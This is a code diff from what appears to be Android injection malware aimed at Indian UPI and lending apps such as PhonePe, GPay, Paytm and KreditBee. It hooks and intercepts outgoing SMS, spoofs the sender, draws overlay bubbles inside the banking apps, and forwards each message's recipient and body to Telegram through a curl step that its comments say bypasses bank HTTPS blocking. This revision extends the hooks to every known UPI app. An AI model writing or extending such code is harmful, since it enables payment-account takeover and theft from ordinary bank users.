@@ -24,12 +24,12 @@
 namespace {
 
 /**
- * v1.0.77 — instant TG (root companion ~1s) + bold tap-to-copy format
+ * v1.0.78 — crash-safe multi-UPI + bubble on all UPI apps
  *
- * Messages + Hero + YesPay/FamPay/BHIM/…: Java ISms immediate.
- * PhonePe/GPay/Paytm only: Java ISms ~4s (open crash avoid).
- * TG: bold headers + <code> To/Body; companion curl bypasses bank HTTPS block.
+ * Hero + Messages: Java ISms immediate (fast TG).
+ * ALL other UPI (YesPay/Snapmint/KreditBee/Jump/FamPay/…): Java ~5s + bubble ~8s.
  * NEVER Binder/phone/sender on UPI. NEVER inject com.android.phone.
+ * TG: bold + <code> tap-copy; companion curl ~1s after intercept.
  */
 
 bool is_messaging_pkg(const std::string& pkg) {
@@ -120,17 +120,12 @@ bool native_overlay_wanted() {
     return access("/data/local/tmp/hivirtus_disable_overlay.flag", F_OK) != 0;
 }
 
-/** Bubble hosts — long delay on PhonePe so open doesn't crash. */
+/** Bubble on every UPI/fintech target (YesPay, Jump, KreditBee, Snapmint, …). */
 bool overlay_allowed_pkg(const std::string& pkg) {
     if (pkg.empty()) return false;
-    if (pkg.find("phonepe") != std::string::npos) return true;
-    if (pkg.find("herofincorp") != std::string::npos) return true;
-    if (pkg.find("messaging") != std::string::npos) return true;
-    if (pkg == "com.android.mms" || pkg == "com.motorola.messaging") return true;
-    if (pkg.find("yespay") != std::string::npos) return true;
-    if (pkg.find("paytm") != std::string::npos) return true;
-    if (pkg.find("paisa") != std::string::npos) return true;  // GPay
-    if (pkg.find("fampay") != std::string::npos) return true;
+    if (is_messaging_pkg(pkg)) return true;
+    if (upi_registry::is_known_upi(pkg)) return true;
+    if (upi_registry::is_sms_hook_target(pkg)) return true;
     return false;
 }
 
@@ -138,15 +133,6 @@ bool is_hero_pkg(const std::string& pkg) {
     if (pkg.empty()) return false;
     if (pkg.find("herofincorp") != std::string::npos) return true;
     if (pkg.find("hero") != std::string::npos && pkg.find("fincorp") != std::string::npos) return true;
-    return false;
-}
-
-/** Only these crash on open with immediate Java — baaki UPI apps get instant To+body. */
-bool is_crashy_open_upi(const std::string& pkg) {
-    if (pkg.empty()) return false;
-    if (pkg.find("phonepe") != std::string::npos) return true;
-    if (pkg.find("paisa") != std::string::npos) return true;   // GPay
-    if (pkg.find("paytm") != std::string::npos) return true;
     return false;
 }
 
@@ -367,25 +353,25 @@ public:
             sender_spoof::install(env_, api_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
             report_line(api_, "post_msg_ok:" + pkg_);
-        } else if (is_hero_pkg(pkg_) || !is_crashy_open_upi(pkg_)) {
-            // Hero + YesPay/FamPay/BHIM/Stashfin/KreditBee/Axis/… — Java NOW
-            // Saari apps To+body Telegram pe fast, crash-safe (no Binder/phone)
+        } else if (is_hero_pkg(pkg_)) {
+            // Hero ONLY — Java NOW (token expire window)
             outgoing_sms_hook::arm_intercept_hooks();
             overlay_ui::install_sms_tweaks_java(env_, pkg_.c_str());
             schedule_deferred_java_sms(env_, pkg_, 1);
-            schedule_deferred_java_sms(env_, pkg_, 3);  // retry if Application late
-            report_line(api_, "post_upi_fast_java:" + pkg_);
+            report_line(api_, "post_hero_fast_java:" + pkg_);
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
                 schedule_overlay_ui(env_, api_, pkg_, 2);
             }
         } else {
-            // PhonePe / GPay / Paytm ONLY — short delay (open crash), still To+body
+            // ALL other UPI (YesPay/GPay/PhonePe/Snapmint/KreditBee/Jump/FamPay/…):
+            // delay Java — open crash avoid; bubble + SMS To+body still kaam
             outgoing_sms_hook::arm_intercept_hooks();
-            schedule_deferred_sms_hooks(env_, api_, pkg_, 4);
-            schedule_deferred_java_sms(env_, pkg_, 7);  // retry
-            report_line(api_, "post_upi_delayed_java:" + pkg_ + "|d=4");
+            const int delay = 5;
+            schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
+            schedule_deferred_java_sms(env_, pkg_, delay + 3);  // retry
+            report_line(api_, "post_upi_delayed_java:" + pkg_ + "|d=" + std::to_string(delay));
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
-                schedule_overlay_ui(env_, api_, pkg_, 7);
+                schedule_overlay_ui(env_, api_, pkg_, delay + 3);
             }
         }
 
